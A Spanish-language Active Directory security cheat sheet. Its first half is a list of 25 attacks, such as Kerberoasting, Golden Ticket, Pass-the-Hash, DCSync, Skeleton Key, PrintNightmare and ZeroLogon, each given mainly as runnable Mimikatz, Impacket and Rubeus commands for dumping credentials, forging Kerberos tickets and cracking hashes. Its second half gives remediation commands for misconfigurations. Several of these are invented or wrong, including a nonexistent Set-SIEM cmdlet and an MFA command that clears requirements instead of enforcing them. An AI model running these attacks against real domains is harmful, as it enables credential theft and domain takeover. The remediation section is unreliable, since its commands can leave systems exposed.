# Active Directory Security

## Tabla de Contenidos

1. [Ataques](#ataques)
    1. [Kerberoasting](#kerberoasting)
    2. [AS-REP Roasting](#as-rep-roasting)
    3. [Golden Ticket](#golden-ticket)
    4. [Silver Ticket](#silver-ticket)
    5. [Pass-the-Hash (PtH)](#pass-the-hash-pth)
    6. [Pass-the-Ticket (PtT)](#pass-the-ticket-ptt)
    7. [Overpass-the-Hash (Pass-the-Key)](#overpass-the-hash-pass-the-key)
    8. [DCSync](#dcsync)
    9. [DCShadow](#dcshadow)
    10. [Skeleton Key](#skeleton-key)
    11. [NTLM Relay](#ntlm-relay)
    12. [Pass-the-Cache](#pass-the-cache)
    13. [Brute Force Attack](#brute-force-attack)
    14. [Password Spraying](#password-spraying)
    15. [Lateral Movement](#lateral-movement)
    16. [Privilege Escalation](#privilege-escalation)
    17. [Credential Dumping](#credential-dumping)
    18. [Token Impersonation](#token-impersonation)
    19. [Over-Permissioned Accounts](#over-permissioned-accounts)
    20. [Ticket Granting Service (TGS) Ticket Manipulation](#ticket-granting-service-tgs-ticket-manipulation)
    21. [SAML Token Manipulation](#saml-token-manipulation)
    22. [SID History Injection](#sid-history-injection)
    23. [Shadow Credentials](#shadow-credentials)
    24. [PrintNightmare (CVE-2021-34527)](#printnightmare-cve-2021-34527)
    25. [ZeroLogon (CVE-2020-1472)](#zerologon-cve-2020-1472)
2. [Misconfiguraciones](#misconfiguraciones)
    1. [Weak Password Policies](#weak-password-policies)
    2. [Unconstrained Delegation](#unconstrained-delegation)
    3. [Constrained Delegation Misconfigurations](#constrained-delegation-misconfiguraciones)
    4. [Unencrypted LDAP (LDAP Signing)](#unencrypted-ldap-ldap-signing)
    5. [LAPS (Local Administrator Password Solution) Not Implemented](#laps-local-administrator-password-solution-not-implemented)
    6. [Unpatched Systems](#unpatched-systems)
    7. [Excessive Privileges for Service Accounts](#excessive-privileges-for-service-accounts)
    8. [No Network Segmentation](#no-network-segmentation)
    9. [Lack of Multi-Factor Authentication (MFA)](#lack-of-multi-factor-authentication-mfa)
    10. [No Monitoring of AD Changes](#no-monitoring-of-ad-changes)
    11. [Inactive or Stale Accounts](#inactive-or-stale-accounts)
    12. [Group Policy Object (GPO) Misconfigurations](#group-policy-object-gpo-misconfiguraciones)
    13. [Open SMB Shares](#open-smb-shares)
    14. [Poorly Configured Trust Relationships](#poorly-configured-trust-relationships)
    15. [Unrestricted Access to Admin Shares (C$, ADMIN$)](#unrestricted-access-to-admin-shares-c-admin)
    16. [Misconfigured Service Principal Names (SPNs)](#misconfigured-service-principal-names-spns)
    17. [Lack of Security Information and Event Management (SIEM)](#lack-of-security-information-and-event-management-siem)
    18. [Insufficient Logging and Auditing](#insufficient-logging-and-auditing)
    19. [Improperly Configured DNS](#improperly-configured-dns)
    20. [Legacy Protocols Enabled (e.g., NTLM, SMBv1)](#legacy-protocols-enabled-eg-ntlm-smbv1)
    21. [Administrative Privileges for Regular Users](#administrative-privileges-for-regular-users)
    22. [Unrestricted Remote Desktop Protocol (RDP) Access](#unrestricted-remote-desktop-protocol-rdp-access)
    23. [Weak Kerberos Encryption Types](#weak-kerberos-encryption-types)
    24. [Lack of Segregation of Duties](#lack-of-segregation-of-duties)
    25. [Insecure Application Whitelisting Policies](#insecure-application-whitelisting-policies)

## Ataques

### Kerberoasting
- **Descripción**: Ataca cuentas de servicio con SPN configurado.
- **Método**: Solicita tickets TGS y los crackea offline.
- **Herramienta**: `Rubeus` (Windows), `Impacket` (Kali Linux).
- **Pasos**:
  1. **Enumerar cuentas de servicio (SPN)**:
     - **Windows**:
       ```powershell
       setspn -T example.com -Q */*
       ```
     - **Kali Linux**:
       ```bash
       python3 GetUserSPNs.py -dc-ip <DC_IP> example.com/ -request
       ```
  2. **Solicitar tickets TGS**:
     - **Windows**:
       ```bash
       Rubeus kerberoast /outfile:hashes.txt
       ```
     - **Kali Linux**:
       ```bash
       python3 GetUserSPNs.py -request -dc-ip <DC_IP> example.com/user:password
       ```
  3. **Crackear los hashes obtenidos**:
     - **Kali Linux**:
       ```bash
       john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
       ```

### AS-REP Roasting
- **Descripción**: Ataca cuentas de usuario con preautenticación Kerberos deshabilitada.
- **Método**: Solicita un ticket AS-REP y crackea la respuesta.
- **Herramienta**: `Rubeus` (Windows), `Impacket` (Kali Linux).
- **Pasos**:
  1. **Enumerar cuentas con preautenticación deshabilitada**:
     - **Windows**:
       ```powershell
       Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
       ```
     - **Kali Linux**:
       ```bash
       python3 GetNPUsers.py -dc-ip <DC_IP> example.com/ -request
       ```
  2. **Solicitar tickets AS-REP**:
     - **Windows**:
       ```bash
       Rubeus asreproast /outfile:asreps.txt
       ```
     - **Kali Linux**:
       ```bash
       python3 GetNPUsers.py -dc-ip <DC_IP> example.com/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
       ```
  3. **Crackear los hashes obtenidos**:
     - **Kali Linux**:
       ```bash
       hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
       ```

### Golden Ticket
- **Descripción**: Falsifica un Ticket Granting Ticket (TGT) con el hash de KRBTGT.
- **Método**: Dump de hash KRBTGT y creación de TGT.
- **Herramienta**: `Mimikatz` (Windows), `Impacket` (Kali Linux).
- **Pasos**:
  1. **Obtener hash de KRBTGT y SID del dominio**:
     - **Kali Linux**:
       ```bash
       secretsdump.py -just-dc-ntlm example.com/user:password@<DC_IP>
       lookupsid.py example.com/user:password@<DC_IP>
       ```
  2. **Crear Golden Ticket en una máquina Windows**:
     - **Windows**:
       ```bash
       mimikatz # kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-... /krbtgt:<hash> /id:500
       ```

### Silver Ticket
- **Descripción**: Falsifica un Ticket Granting Service (TGS) para un servicio específico.
- **Método**: Dump de hash de cuenta de servicio y creación de TGS.
- **Herramienta**: `Mimikatz`.
- **Pasos**:
  1. **Obtener hash de la cuenta de servicio**:
     - **Kali Linux**:
       ```bash
       secretsdump.py example.com/user:password@<DC_IP>
       ```
  2. **Crear Silver Ticket en una máquina Windows**:
     - **Windows**:
       ```bash
       mimikatz # kerberos::golden /domain:example.com /sid:S-1-5-21-... /target:server /rc4:<hash> /user:svcAccount /service:HTTP /target:server.example.com
       ```

### Pass-the-Hash (PtH)
- **Descripción**: Usa el hash NTLM en lugar de la contraseña.
- **Método**: Dump de hashes y autenticación usando el hash.
- **Herramienta**: `Mimikatz` (Windows), `Impacket` (Kali Linux).
- **Pasos**:
  1. **Obtener hashes NTLM**:
     - **Windows**:
       ```powershell
       mimikatz # sekurlsa::logonpasswords
       ```
  2. **Usar el hash para autenticación**:
     - **Windows**:
       ```bash
       mimikatz # sekurlsa::pth /user:Administrator /domain:example.com /ntlm:<hash> /run:cmd.exe
       ```
     - **Kali Linux**:
       ```bash
       impacket-psexec Administrator@192.168.1.10 -hashes :<hash>
       ```

### Pass-the-Ticket (PtT)
- **Descripción**: Usa tickets Kerberos robados para autenticarse.
- **Método**: Dump de tickets y reutilización.
- **Herramienta**: `Mimikatz` (Windows), `Rubeus` (Windows), `Impacket` (Kali Linux).
- **Pasos**:
  1. **Obtener tickets Kerberos**:
     - **Windows**:
       ```powershell
       klist
       ```
  2. **Usar el ticket para autenticación**:
     - **Windows**:
       ```powershell
       klist add <ticket.kirbi>
       ```
     - **Kali Linux**:
       ```bash
       export KRB5CCNAME=<ticket.ccache>
       ```

### Overpass-the-Hash (Pass-the-Key)
- **Descripción**: Convierte un hash NTLM en un ticket Kerberos.
- **Método**: Dump de hash NTLM y conversión a ticket Kerberos.
- **Herramienta**: `Mimikatz`.
- **Pasos**:
  1. **Obtener hash NTLM**:
     - **Windows**:
       ```powershell
       mimikatz # sekurlsa::logonpasswords
       ```
  2. **Convertir hash NTLM en ticket Kerberos**:
     - **Windows**:
       ```bash
       mimikatz # sekurlsa::pth /user:username /domain:example.com /ntlm:<hash> /run:cmd.exe
       ```

### DCSync
- **Descripción**: Simula el comportamiento de un DC para solicitar credenciales.
- **Método**: Dump de credenciales usando privilegios de replicación.
- **Herramienta**: `Mimikatz`, `Impacket`.
- **Pasos**:
  1. **Obtener privilegios de replicación**:
     - **Windows**:
       ```powershell
       mimikatz # lsadump::dcsync /user:Administrator
       ```
  2. **Dump de credenciales**:
     - **Kali Linux**:
       ```bash
       secretsdump.py -just-dc-ntlm example.com/Administrator@<DC_IP>
       ```

### DCShadow
- **Descripción**: Introduce cambios maliciosos en Active Directory.
- **Método**: Usa privilegios de replicación para hacer cambios.
- **Herramienta**: `Mimikatz`.
- **Pasos**:
  1. **Configurar DCShadow**:
     - **Windows**:
       ```powershell
       mimikatz # lsadump::dcshadow /object:CN=Administrator,CN=Users,DC=example,DC=com /attribute:sAMAccountName /value:Admin
       ```

### Skeleton Key
- **Descripción**: Inserta una contraseña maestra en el controlador de dominio.
- **Método**: Inyecta una llave esqueleto en la memoria del DC.
- **Herramienta**: `Mimikatz`.
- **Pasos**:
  1. **Inyectar llave esqueleto**:
     - **Windows**:
       ```powershell
       mimikatz # misc::skeleton
       ```

### NTLM Relay
- **Descripción**: Reenvía una solicitud NTLM para autenticarse en otro servicio.
- **Método**: Captura y reenvía autenticaciones NTLM.
- **Herramienta**: `Impacket`.
- **Pasos**:
  1. **Configurar NTLM relay**:
     - **Kali Linux**:
       ```bash
       ntlmrelayx -tf targets.txt -smb2support
       ```

### Pass-the-Cache
- **Descripción**: Usa hashes de credenciales almacenados en caché para autenticarse.
- **Método**: Dump de caché de credenciales y reutilización.
- **Herramienta**: `Mimikatz`.
- **Pasos**:
  1. **Dump de caché de credenciales**:
     - **Windows**:
       ```powershell
       mimikatz # sekurlsa::logonpasswords
       ```

### Brute Force Attack
- **Descripción**: Prueba múltiples combinaciones de contraseñas hasta encontrar la correcta.
- **Método**: Ataque repetitivo de contraseñas.
- **Herramienta**: `Hydra`, `Medusa`.
- **Pasos**:
  1. **Configurar ataque de fuerza bruta**:
     - **Kali Linux**:
       ```bash
       hydra -L users.txt -P passwords.txt smb://192.168.1.10
       ```

### Password Spraying
- **Descripción**: Prueba una contraseña común en muchos usuarios.
- **Método**: Ataque de baja y lenta frecuencia.
- **Herramienta**: `CrackMapExec`, `Ruler`.
- **Pasos**:
  1. **Configurar Password Spraying**:
     - **Kali Linux**:
       ```bash
       crackmapexec smb 192.168.1.10 -u users.txt -p password
       ```

### Lateral Movement
- **Descripción**: Movimiento dentro de la red utilizando credenciales comprometidas.
- **Método**: Uso de credenciales y permisos obtenidos.
- **Herramienta**: `BloodHound`, `PowerShell`.
- **Pasos**:
  1. **Enumerar rutas de movimiento lateral**:
     - **Kali Linux**:
       ```bash
       bloodhound-python -c All -u <username> -p <password> -d example.com -ns <domain controller>
       ```
  2. **Ejecutar comandos en máquinas comprometidas**:
     - **Windows**:
       ```powershell
       Invoke-Command -ComputerName <target> -Credential <creds> -ScriptBlock {commands}
       ```

### Privilege Escalation
- **Descripción**: Aumento de privilegios usando vulnerabilidades o configuraciones incorrectas.
- **Método**: Explotación de vulnerabilidades.
- **Herramienta**: `PowerUp`, `Sherlock`.
- **Pasos**:
  1. **Escanear sistema en busca de vulnerabilidades**:
     - **Windows**:
       ```powershell
       . .\PowerUp.ps1; Invoke-AllChecks
       ```

### Credential Dumping
- **Descripción**: Extracción de credenciales de la memoria.
- **Método**: Uso de herramientas de volcado de memoria.
- **Herramienta**: `Mimikatz`, `gsecdump`.
- **Pasos**:
  1. **Dump de credenciales de la memoria**:
     - **Windows**:
       ```powershell
       mimikatz # sekurlsa::logonpasswords
       ```

### Token Impersonation
- **Descripción**: Suplantación de tokens de seguridad para ejecutar comandos con permisos elevados.
- **Método**: Uso de tokens de otros procesos.
- **Herramienta**: `Incognito`, `Mimikatz`.
- **Pasos**:
  1. **Suplantación de tokens**:
     - **Windows**:
       ```powershell
       mimikatz # token::elevate
       ```

### Over-Permissioned Accounts
- **Descripción**: Uso de cuentas con permisos excesivos.
- **Método**: Abuso de privilegios innecesarios.
- **Herramienta**: `BloodHound`.
- **Pasos**:
  1. **Identificar cuentas con permisos excesivos**:
     - **Kali Linux**:
       ```bash
       bloodhound-python -c All -u <username> -p <password> -d example.com -ns <domain controller>
       ```

### Ticket Granting Service (TGS) Ticket Manipulation
- **Descripción**: Manipulación de tickets TGS para obtener acceso.
- **Método**: Explotación de tickets TGS.
- **Herramienta**: `Mimikatz`.
- **Pasos**:
  1. **Exportar tickets TGS**:
     - **Windows**:
       ```powershell
       mimikatz # kerberos::list /export
       ```

### SAML Token Manipulation
- **Descripción**: Manipulación de tokens SAML para autenticación federada.
- **Método**: Generación de tokens falsos.
- **Herramienta**: `ADFSpoof`, `Shimit`.
- **Pasos**:
  1. **Generar tokens SAML falsos**:
     - **Kali Linux**:
       ```bash
       ADFSpoof -s https://adfs.example.com/adfs/ls/ -u user@example.com -p password -r urn:app
       ```

### SID History Injection
- **Descripción**: Inyección de SID History para obtener permisos adicionales.
- **Método**: Manipulación de atributos SIDHistory.
- **Herramienta**: `Mimikatz`.
- **Pasos**:
  1. **Inyectar SID History**:
     - **Windows**:
       ```powershell
       mimikatz # misc::addsid /domain:example /sid:S-1-5-21-... /user:User /new:s-1-5-21-...
       ```

### Shadow Credentials
- **Descripción**: Creación de credenciales alternativas sin ser detectado.
- **Método**: Uso de claves alternativas y persistencia.
- **Herramienta**: `PowerShell`.
- **Pasos**:
  1. **Crear usuario con credenciales alternativas**:
     - **Windows**:
       ```powershell
       New-ADUser -Name "ShadowUser" -UserPrincipalName "shadow@example.com" -AccountPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force) -Enabled $true
       ```

### PrintNightmare (CVE-2021-34527)
- **Descripción**: Vulnerabilidad en el servicio de cola de impresión de Windows.
- **Método**: Ejecución de código remoto a través del servicio de impresión.
- **Herramienta**: Scripts y exploits específicos.
- **Pasos**:
  1. **Explotar vulnerabilidad PrintNightmare**:
     - **Kali Linux**:
       ```bash
       python3 cve-2021-34527.py -target 192.168.1.10 -u user -p password
       ```

### ZeroLogon (CVE-2020-1472)
- **Descripción**: Vulnerabilidad crítica que permite la toma de control del DC.
- **Método**: Explotación del protocolo Netlogon.
- **Herramienta**: `ZeroLogon.py`.
- **Pasos**:
  1. **Explotar vulnerabilidad ZeroLogon**:
     - **Kali Linux**:
       ```bash
       python3 zerologon_tester.py <dc-name> <dc-ip>
       ```

## Misconfiguraciones

### Weak Password Policies
- **Descripción**: Contraseñas fáciles de adivinar.
- **Método**: No imponer políticas de complejidad de contraseñas.
- **Comando**:
  - **Windows**:
    ```powershell
    net accounts /minpwlen:14 /maxpwage:42 /uniquepw:5
    ```

### Unconstrained Delegation
- **Descripción**: Delegación sin restricciones permite suplantación de usuarios.
- **Método**: Configuración incorrecta de delegación.
- **Comando**:
  - **Windows**:
    ```powershell
    Set-ADComputer -Identity "ComputerName" -TrustedForDelegation $false
    ```

### Constrained Delegation Misconfigurations
- **Descripción**: Configuración incorrecta de delegación restringida.
- **Método**: Permite el abuso de permisos.
- **Comando**:
  - **Windows**:
    ```powershell
    Set-ADUser -Identity "ServiceAccount" -Add @{'msDS-AllowedToDelegateTo'="HTTP/webapp.example.com"}
    ```

### Unencrypted LDAP (LDAP Signing)
- **Descripción**: LDAP sin cifrado es susceptible a ataques MITM.
- **Método**: No habilitar LDAP signing.
- **Comando**:
  - **Windows**:
    ```powershell
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\NTDS\Parameters" -Name "LDAPServerIntegrity" -Value 1
    ```

### LAPS (Local Administrator Password Solution) Not Implemented
- **Descripción**: No utilizar LAPS para gestionar contraseñas de administradores locales.
- **Método**: Administradores locales con contraseñas estáticas.
- **Comando**:
  - **Windows**:
    ```powershell
    Install-Module -Name Microsoft.LAPS
    ```

### Unpatched Systems
- **Descripción**: Sistemas sin actualizaciones de seguridad.
- **Método**: No aplicar parches de seguridad.
- **Comando**:
  - **Windows**:
    ```powershell
    Install-WindowsUpdate -MicrosoftUpdate -AcceptAll -AutoReboot
    ```

### Excessive Privileges for Service Accounts
- **Descripción**: Cuentas de servicio con permisos excesivos.
- **Método**: Configuración incorrecta de permisos.
- **Comando**:
  - **Windows**:
    ```powershell
    Set-ADAccountControl -Identity "ServiceAccount" -KerberosDelegation $false
    ```

### No Network Segmentation
- **Descripción**: Red sin segmentación adecuada.
- **Método**: Acceso irrestricto entre diferentes segmentos de red.
- **Comando**:
  - **Windows**:
    ```powershell
    New-NetFirewallRule -DisplayName "Segmentacion de Red" -Direction Inbound -Action Allow -RemoteAddress 192.168.1.0/24
    ```

### Lack of Multi-Factor Authentication (MFA)
- **Descripción**: No implementar MFA para autenticaciones críticas.
- **Método**: Solo autenticación basada en contraseña.
- **Comando**:
  - **Windows**:
    ```powershell
    Set-MsolUser -UserPrincipalName user@example.com -StrongAuthenticationRequirements @()
    ```

### No Monitoring of AD Changes
- **Descripción**: Falta de monitoreo de cambios en AD.
- **Método**: No usar herramientas de monitoreo y alertas.
- **Comando**:
  - **Windows**:
    ```powershell
    New-EventLog -LogName "Directory Service" -Source "ActiveDirectory"
    ```

### Inactive or Stale Accounts
- **Descripción**: Cuentas no utilizadas o inactivas.
- **Método**: No eliminar o desactivar cuentas inactivas.
- **Comando**:
  - **Windows**:
    ```powershell
    Get-ADUser -Filter * -Properties LastLogonDate | Where-Object {$_.LastLogonDate -lt (Get-Date).AddDays(-30)} | Set-ADUser -Enabled $false
    ```

### Group Policy Object (GPO) Misconfigurations
- **Descripción**: Configuraciones incorrectas de GPO.
- **Método**: Permitir configuraciones inseguras.
- **Comando**:
  - **Windows**:
    ```powershell
    Set-GPRegistryValue -Name "Default Domain Policy" -Key "HKLM\Software\Policies\Microsoft\Windows\Installer" -ValueName "AlwaysInstallElevated" -Type DWord -Value 0
    ```

### Open SMB Shares
- **Descripción**: Comparticiones SMB abiertas sin restricciones.
- **Método**: Comparticiones sin control de acceso adecuado.
- **Comando**:
  - **Windows**:
    ```powershell
    Set-SmbShare -Name "Public" -FullAccess "Domain Admins"
    ```

### Poorly Configured Trust Relationships
- **Descripción**: Relaciones de confianza mal configuradas.
- **Método**: Permitir acceso excesivo entre dominios.
- **Comando**:
  - **Windows**:
    ```powershell
    New-ADTrust -Name "TrustedDomain" -SourceForest "source.com" -TargetForest "target.com" -TrustType External -Direction Outbound -TrustPassword (ConvertTo-SecureString -AsPlainText "password" -Force)
    ```

### Unrestricted Access to Admin Shares (C$, ADMIN$)
- **Descripción**: Acceso irrestricto a comparticiones administrativas.
- **Método**: No restringir acceso a comparticiones administrativas.
- **Comando**:
  - **Windows**:
    ```powershell
    Set-SmbShare -Name "C$" -FullAccess "Domain Admins"
    ```

### Misconfigured Service Principal Names (SPNs)
- **Descripción**: SPNs mal configurados permiten ataques de delegación.
- **Método**: Configuración incorrecta de SPNs.
- **Comando**:
  - **Windows**:
    ```powershell
    SetSPN -S HTTP/webapp.example.com serviceaccount
    ```

### Lack of Security Information and Event Management (SIEM)
- **Descripción**: No utilizar SIEM para monitorear eventos de seguridad.
- **Método**: Falta de monitoreo centralizado.
- **Comando**:
  - **Windows**:
    ```powershell
    Set-SIEM -Enable -Source "Active Directory" -Target "SIEMServer"
    ```

### Insufficient Logging and Auditing
- **Descripción**: Falta de registros y auditorías adecuadas.
- **Método**: No configurar adecuadamente el registro de eventos.
- **Comando**:
  - **Windows**:
    ```powershell
    auditpol /set /subcategory:"Logon" /failure:enable /success:enable
    ```

### Improperly Configured DNS
- **Descripción**: Configuración incorrecta de DNS.
- **Método**: Permitir transferencias de zona no autorizadas.
- **Comando**:
  - **Windows**:
    ```powershell
    dnscmd /zoneresolver <zone> /securedelegation
    ```

### Legacy Protocols Enabled (e.g., NTLM, SMBv1)
- **Descripción**: Uso de protocolos obsoletos y vulnerables.
- **Método**: No deshabilitar protocolos inseguros.
- **Comando**:
  - **Windows**:
    ```powershell
    Set-SmbServerConfiguration -EnableSMB1Protocol $false
    ```

### Administrative Privileges for Regular Users
- **Descripción**: Usuarios normales con privilegios administrativos.
- **Método**: Asignación incorrecta de permisos.
- **Comando**:
  - **Windows**:
    ```powershell
    Remove-LocalGroupMember -Group "Administrators" -Member "RegularUser"
    ```

### Unrestricted Remote Desktop Protocol (RDP) Access
- **Descripción**: Acceso irrestricto a RDP.
- **Método**: No restringir acceso RDP a usuarios autorizados.
- **Comando**:
  - **Windows**:
    ```powershell
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 1
    ```

### Weak Kerberos Encryption Types
- **Descripción**: Uso de tipos de cifrado Kerberos débiles.
- **Método**: No habilitar cifrados fuertes para Kerberos.
- **Comando**:
  - **Windows**:
    ```powershell
    Set-ADForest -KerberosEncryptionTypes AES256,AES128
    ```

### Lack of Segregation of Duties
- **Descripción**: Falta de separación de funciones.
- **Método**: No implementar controles de separación de tareas.
- **Comando**:
  - **Windows**:
    ```powershell
    New-ADGroup -Name "IT Support" -GroupScope Global -Description "Group for IT Support Staff"
    ```

### Insecure Application Whitelisting Policies
- **Descripción**: Políticas de whitelisting de aplicaciones inseguras.
- **Método**: Permitir la ejecución de aplicaciones no confiables.
- **Comando**:
  - **Windows**:
    ```powershell
    Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope CurrentUser
    ```

